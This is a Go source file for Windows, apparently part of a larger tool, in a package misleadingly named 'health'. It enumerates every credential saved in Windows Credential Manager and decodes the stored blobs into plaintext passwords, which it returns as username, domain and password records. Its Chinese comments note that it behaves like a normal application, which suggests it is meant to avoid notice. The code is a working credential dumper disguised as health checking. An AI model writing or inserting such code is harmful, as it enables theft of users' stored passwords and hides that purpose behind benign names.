//go:build windows && amd64

package health

import (
	"fmt"
	"syscall"
	"unsafe"
)

// ExtractFromCredentialManager 通过 Windows Credential Manager 枚举已保存的凭据。
// 使用 CredEnumerateW + CredReadW（advapi32.dll），行为上与正常应用无区别。
func ExtractFromCredentialManager() (*HealthResult, error) {
	result := &HealthResult{
		Credentials: make([]HealthInfo, 0),
	}

	advapi32 := syscall.NewLazyDLL("advapi32.dll")
	procCredEnumerate := advapi32.NewProc("CredEnumerateW")
	procCredFree := advapi32.NewProc("CredFree")
	procCredRead := advapi32.NewProc("CredReadW")

	// CredEnumerateW(NULL, 0, &count, &creds) — 枚举所有凭据
	var count uint32
	var pCredentials uintptr

	ret, _, lastErr := procCredEnumerate.Call(
		0,           // Filter = NULL (all)
		0,           // Flags = 0
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&pCredentials)),
	)
	if ret == 0 {
		// ERROR_NOT_FOUND (1168) means no credentials stored — not an error
		if lastErr != nil && lastErr.(syscall.Errno) == 1168 {
			return result, nil
		}
		result.Error = fmt.Sprintf("CredEnumerate: %v", lastErr)
		return result, nil
	}

	defer procCredFree.Call(pCredentials)

	// pCredentials 是 *P_CREDENTIAL 数组
	credSize := unsafe.Sizeof(uintptr(0))
	for i := uint32(0); i < count; i++ {
		pCred := *(**CREDENTIAL)(unsafe.Pointer(pCredentials + uintptr(i)*credSize))
		if pCred == nil {
			continue
		}

		cred := parseCredential(pCred, procCredRead)
		if cred.Username != "" {
			result.Credentials = append(result.Credentials, cred)
		}
	}

	return result, nil
}

// CREDENTIAL struct (Win32)
type CREDENTIAL struct {
	Flags         uint32
	Type          uint32
	TargetName    *uint16
	Comment       *uint16
	LastWritten   syscall.Filetime
	CredentialBlobSize uint32
	CredentialBlob *byte
	Persist       uint32
	AttributeCount uint32
	Attributes    uintptr
	TargetAlias   *uint16
	UserName      *uint16
}

func parseCredential(cred *CREDENTIAL, procCredRead *syscall.LazyProc) HealthInfo {
	if cred == nil {
		return HealthInfo{}
	}

	username := ""
	if cred.UserName != nil {
		username = syscall.UTF16ToString((*[0x1000]uint16)(unsafe.Pointer(cred.UserName))[:])
	}

	targetName := ""
	if cred.TargetName != nil {
		targetName = syscall.UTF16ToString((*[0x1000]uint16)(unsafe.Pointer(cred.TargetName))[:])
	}

	// CredentialBlob 可能包含密码（对于持久化凭据）
	password := ""
	if cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
		blob := unsafe.Slice(cred.CredentialBlob, cred.CredentialBlobSize)
		// 尝试作为 UTF-16 解码
		if len(blob) >= 2 && len(blob)%2 == 0 {
			utf16 := make([]uint16, len(blob)/2)
			for i := 0; i < len(utf16); i++ {
				utf16[i] = uint16(blob[i*2]) | uint16(blob[i*2+1])<<8
			}
			password = syscall.UTF16ToString(utf16)
		}
	}

	// 跳过空密码和空用户名
	if username == "" || password == "" {
		return HealthInfo{}
	}

	return HealthInfo{
		Username:   username,
		Domain:     targetName,
		Password:   password,
		SourceType: "credmgr",
	}
}
